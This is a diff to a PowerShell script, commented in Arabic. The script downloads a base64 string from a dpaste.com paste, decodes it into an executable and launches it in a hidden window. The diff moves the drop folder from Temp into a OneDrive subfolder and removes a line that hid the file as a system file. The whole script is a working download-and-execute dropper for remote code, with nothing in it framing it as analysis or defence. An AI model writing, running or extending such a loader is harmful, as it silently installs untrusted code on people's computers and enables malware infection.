@@ -1,14 +1,14 @@
-﻿# تحديد الرابط الذي يحتوي على السلسلة النصية المشفرة
+# تحديد الرابط الذي يحتوي على السلسلة النصية المشفرة
 $url = "https://dpaste.com/EE63B5B9B.txt"
 
-# تحديد المسار لحفظ السلسلة المشفرة المحملة وملف EXE في AppData\Roaming
-$tempFolder = "C:\Users\$env:USERNAME\AppData\Local\Temp"
-$outputFile = "$tempFolder\base64_data.txt"
-$outputExe = "$tempFolder\script.exe"
+# تحديد المسار لحفظ السلسلة المشفرة المحملة في OneDrive
+$oneDriveFolder = "C:\Users\$env:USERNAME\OneDrive\MyApp"
+$outputFile = "$oneDriveFolder\base64_data.txt"
+$outputExe = "$oneDriveFolder\script.exe"
 
-# التأكد من وجود المجلد في AppData\Roaming، إذا لم يكن موجودًا سيتم إنشاؤه
-if (-not (Test-Path $tempFolder)) {
-    New-Item -ItemType Directory -Path $tempFolder
+# التأكد من وجود المجلد في OneDrive، إذا لم يكن موجودًا سيتم إنشاؤه
+if (-not (Test-Path $oneDriveFolder)) {
+    New-Item -ItemType Directory -Path $oneDriveFolder
 }
 
 # تحميل السلسلة النصية من الرابط إلى الملف
@@ -40,7 +40,7 @@ try {
     exit
 }
 
-# كتابة البيانات إلى الملف EXE في AppData\Roaming
+# كتابة البيانات إلى الملف EXE
 [System.IO.File]::WriteAllBytes($outputExe, $bytes)
 
 # تحقق مما إذا تم إنشاء EXE بنجاح
@@ -49,9 +49,6 @@ if (Test-Path $outputExe) {
     
     # إضافة تأخير بسيط قبل محاولة تشغيل EXE
     Start-Sleep -Seconds 2
-
-    # جعل الملف EXE في AppData\Roaming مخفيًا كملف نظام
-    attrib +h +s $outputExe
 
     # تشغيل EXE في الخلفية باستخدام Start-Process
     Start-Process -FilePath $outputExe -WindowStyle Hidden
